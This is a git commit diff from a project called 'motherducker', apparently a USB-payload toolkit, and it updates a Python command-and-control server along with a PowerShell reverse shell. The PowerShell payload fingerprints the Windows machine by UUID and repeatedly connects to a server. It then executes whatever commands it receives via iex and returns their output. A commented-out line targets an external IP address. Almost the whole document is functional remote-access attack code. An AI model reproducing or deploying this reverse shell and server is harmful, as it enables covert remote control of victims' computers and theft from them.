8464f119b926724cb3e615eaede7b7a408a4cdd6
puijjar <puijjar@gmail.com>
2019-12-14 01:23:17 +0100

    Small improvements.

--- motherducker/payloads/communication.py
+++ motherducker/payloads/communication.py
@@ -1,23 +1,73 @@
 import asyncio
-from asyncio import Queue, StreamReader, StreamWriter, run
+from asyncio import Queue, StreamReader, StreamWriter, TimeoutError, run, wait_for
 import struct
+from datetime import datetime
 from typing import Tuple
 
 
-async def _read(reader: StreamReader) -> bytes:
+DEFAULT_TIMEOUT = 60
+
+
+def _largest_power_of_two(n: int) -> int:
+
+    """ Return largest power of two less than or equal to <n>. """
+
+    # Prevent negative shift.
+    if n < 1:
+        return None
+    return 1 << (n.bit_length() - 1)
+
+
+async def _recv_data(reader: StreamReader,
+                     length: int,
+                     timeout: float) -> bytes:
+
+    """ Receive <length> amount of data from <reader>. """
+
+    if length < 1:
+        return None
+
+    # Preallocate bytearray.
+    data = bytearray(length)
+    index = 0
+    while index < length:
+        diff = length - index
+
+        # Retrieve data in power of two sized chunks capped at <reader> limit.
+        buf_size = _largest_power_of_two(diff)
+        if buf_size > reader._limit:
+            buf_size = reader._limit
+
+        # Wait at most <timeout> seconds, then return None.
+        try:
+            chunk = await wait_for(reader.read(buf_size), timeout)
+        except TimeoutError:
+            return None
+
+        # Return None in case less data received than expected.
+        if not chunk:
+            return None
+
+        data[index:index+buf_size] = chunk
+        index += buf_size
+
+    # Return None in case more data received than expected.
+    if len(data) > length:
+        return None
+
+    return bytes(data)
+
+
+async def _read(reader: StreamReader,
+                timeout: float = DEFAULT_TIMEOUT) -> bytes:
 
     # Each message is prepended by 8 bytes representing
     # the remaining message length. Assuming little-endian?
-    try:
-        expected_len = struct.unpack('<Q', await reader.read(8))[0]
-    except struct.error:
-        return None
+    chunk = await _recv_data(reader, 8, timeout)
+    expected_len = struct.unpack('<Q', chunk)[0]
 
     # Read stream until <expected_len> bytes.
-    response = b''
-    while len(response) < expected_len:
-        response += await reader.read(expected_len - len(response))
-    return response
+    return await _recv_data(reader, expected_len, timeout)
 
 
 async def _send(writer: StreamWriter,
@@ -47,16 +97,13 @@ async def _handle(reader: StreamReader,
         await _send(writer, cmd)
         response = await _read(reader)
 
-        print(response)
-
     await _send(writer, cmd)
     writer.close()
 
 
 async def start_server(addr: Tuple[str, int]) -> None:
 
-    server = await asyncio.start_server(
-        _handle, *addr)
+    server = await asyncio.start_server(_handle, *addr)
 
     async with server:
         await server.serve_forever()
--- motherducker/payloads/reverse_shell.ps1
+++ motherducker/payloads/reverse_shell.ps1
@@ -1,24 +1,23 @@
-# Get UUID of the machine.
+# Get UUID of Windows machine. Random bytes for Linux.
 try {
     $uuid = [System.Text.Encoding]::UTF8.GetBytes((Get-WMIObject Win32_ComputerSystemProduct).UUID);
-} catch [System.Management.Automation.CommandNotFoundException] { # For testing on Linux.
-    $uuid = [System.Text.Encoding]::UTF8.GetBytes((Get-Random));
+} catch [System.Management.Automation.CommandNotFoundException] {
+    $uuid = 0;#[System.Text.Encoding]::UTF8.GetBytes((Get-Random));
 }
 
-# Calculate SHA-256 hash from UUID.
+# Compute SHA-256 hash of $uuid.
 $hasher = [System.Security.Cryptography.HashAlgorithm]::Create("sha256");
-$uuid = $hasher.ComputeHash($uuid);
+$uuid_hash = $hasher.ComputeHash($uuid);
 
 # Preallocate byte array of sensible size with zeroes.
 [byte[]] $bytes = 0..65535 | % {0};
 
-# Loop indefinitely until "exit" command is issued.
+# Try to establish connection indefinitely until "exit" command is issued.
 while (1) {
 
     # Attempt to establish connection to server. Retry every 3 seconds.
     try {
-        #$client = New-Object System.Net.Sockets.TCPClient("145.24.222.156", 5000);
-        $client = New-Object System.Net.Sockets.TCPClient("localhost", 5000);
+        $client = New-Object System.Net.Sockets.TCPClient("localhost", 5000); # 145.24.222.156", 5000);
     } catch { # Catch ConstructorInvokedThrowException..
         Start-Sleep -s 3;
         continue;
@@ -27,10 +26,9 @@ while (1) {
     # Initialize byte stream.
     $stream = $client.GetStream();
 
-    # Send UUID as initial message.
-    $out = $uuid
-    $out = [System.BitConverter]::GetBytes([int64] $out.Length) + $out
-    $stream.Write($out, 0, $out.Length);
+    # Send UUID hash as initial message.
+    $out = [System.BitConverter]::GetBytes([int64] $uuid_hash.Length) + $uuid_hash;
+    $stream.Write($out, 0, $out.Length)
     $stream.Flush();
 
     # Keep session established.
@@ -40,7 +38,7 @@ while (1) {
         $in = $stream.Read($bytes, 0, $bytes.Length);
         $cmd = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $in);
 
-        # Retry in 2 seconds if there were nothing to read.
+        # Retry in 2 seconds if there was nothing to read.
         if ($cmd -eq "") {
             Start-Sleep -s 2;
             continue;
@@ -52,11 +50,10 @@ while (1) {
         }
 
         # Run command.
-        $result = (iex $cmd 2>&1 | Out-String)
+        $result = [System.Text.Encoding]::UTF8.GetBytes((iex $cmd 2>&1 | Out-String));
 
         # Send response.
-        $out = [System.Text.Encoding]::UTF8.GetBytes($result);
-        $out = [System.BitConverter]::GetBytes([int64] $out.Length) + $out
+        $out = [System.BitConverter]::GetBytes([int64] $result.Length) + $result;
         $stream.Write($out, 0, $out.Length);
         $stream.Flush();
     }
